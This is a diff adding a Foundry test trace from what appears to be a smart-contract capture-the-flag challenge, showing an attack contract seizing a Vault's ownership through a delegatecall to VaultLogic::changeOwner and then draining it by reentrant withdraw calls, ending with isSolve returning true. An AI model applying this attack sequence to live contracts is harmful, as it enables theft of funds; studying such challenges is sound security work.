@@ -1,0 +1,65 @@
+Traces:
+  [376315] VaultExploiter::testExploit()
+    ├─ [0] VM::deal(SHA-256: [0x0000000000000000000000000000000000000002], 1000000000000000000 [1e18])
+    │   └─ ← [Return] 
+    ├─ [0] VM::startPrank(SHA-256: [0x0000000000000000000000000000000000000002])
+    │   └─ ← [Return] 
+    ├─ [235293] → new AttackVault@0xE536720791A7DaDBeBdBCD8c8546fb0791a11901
+    │   └─ ← [Return] 953 bytes of code
+    ├─ [0] VM::deal(AttackVault: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901], 1000000000000000000 [1e18])
+    │   └─ ← [Return] 
+    ├─ [17552] AttackVault::attack()
+    │   ├─ [13939] Vault::changeOwner(0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459, AttackVault: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901])
+    │   │   ├─ [8804] VaultLogic::changeOwner(0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459, AttackVault: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901]) [delegatecall]
+    │   │   │   ├─ [0] console::log(0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459) [staticcall]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [0] console::log(0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459) [staticcall]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Stop] 
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [348] Vault::owner() [staticcall]
+    │   └─ ← [Return] AttackVault: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901]
+    ├─ [0] VM::assertEq(AttackVault: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901], AttackVault: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901]) [staticcall]
+    │   └─ ← [Return] 
+    ├─ [71207] AttackVault::attackWithdraw()
+    │   ├─ [22434] Vault::deposite{value: 1000000000000000000}()
+    │   │   └─ ← [Stop] 
+    │   ├─ [22413] Vault::openWithdraw()
+    │   │   └─ ← [Stop] 
+    │   ├─ [18120] Vault::withdraw()
+    │   │   ├─ [0] console::log(true) [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [0] console::log(1000000000000000000 [1e18]) [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [9589] AttackVault::receive{value: 1000000000000000000}()
+    │   │   │   ├─ [8824] Vault::withdraw()
+    │   │   │   │   ├─ [0] console::log(true) [staticcall]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [0] console::log(1000000000000000000 [1e18]) [staticcall]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [293] AttackVault::receive{value: 1000000000000000000}()
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Stop] 
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [0] VM::assertEq(0, 0) [staticcall]
+    │   └─ ← [Return] 
+    ├─ [0] console::log("attack balance: ", 2000000000000000000 [2e18]) [staticcall]
+    │   └─ ← [Stop] 
+    ├─ [0] console::log("logic balance: ", 0) [staticcall]
+    │   └─ ← [Stop] 
+    ├─ [0] console::log("owner balance: ", 0) [staticcall]
+    │   └─ ← [Stop] 
+    ├─ [0] console::log("palyer balance: ", 1000000000000000000 [1e18]) [staticcall]
+    │   └─ ← [Stop] 
+    ├─ [330] Vault::isSolve() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return] 
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 27.24ms (11.11ms CPU time)
+
+Ran 1 test suite in 2.54s (27.24ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
